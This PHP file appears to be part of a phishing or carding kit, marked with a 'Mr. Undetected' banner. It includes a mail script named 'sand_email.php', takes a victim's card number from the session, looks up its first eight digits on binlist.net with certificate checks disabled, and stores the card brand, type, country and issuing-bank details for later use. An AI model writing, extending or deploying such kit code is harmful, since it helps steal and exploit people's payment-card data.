<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 


include("sand_email.php");



$bin        = str_replace(' ', '', $_SESSION['_cardnumber_']);
$bin        = substr($bin, 0, 8);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);


$_SESSION['_ccbrand_'] = $ccbrand   = $details->scheme;
$_SESSION['_cctype_'] = $cctype    = $details->type;


$_SESSION['_alpha2country_'] = $alpha2country    = $details->country->alpha2;
$_SESSION['_namecountry_'] = $namecountry    = $details->country->name;
$_SESSION['_currencycountry_'] = $currencycountry    = $details->country->currency;



$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$_SESSION['_urlbank_'] = $urlbank   = $details->bank->url;
$_SESSION['_phonebank_'] = $phonebank   = $details->bank->phone;
$_SESSION['_citybank_'] = $citybank   = $details->bank->city;


?>
